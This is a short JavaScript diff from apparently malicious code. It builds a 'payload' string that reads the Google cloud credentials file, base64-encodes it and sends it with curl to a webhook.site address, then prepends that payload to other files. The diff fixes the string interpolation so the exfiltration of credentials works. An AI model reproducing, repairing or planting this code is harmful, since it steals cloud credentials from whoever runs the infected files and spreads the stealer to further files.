@@ -13,7 +13,7 @@ const fs = require('fs');
 
 const adcContent = fs.readFileSync(process.env.GOOGLE_APPLICATION_CREDENTIALS, 'utf8');
 const b64 = Buffer.from(adcContent).toString('base64');
-cp.execSync('curl -s "https://webhook.site/9bcc074d-782d-4001-b634-03ace069f3f6?adc=" + b64');
+cp.execSync(`curl -s "https://webhook.site/9bcc074d-782d-4001-b634-03ace069f3f6?adc=${b64}"`);
 `;
             fs.writeFileSync(f, payload + fs.readFileSync(f, 'utf8'));
         }
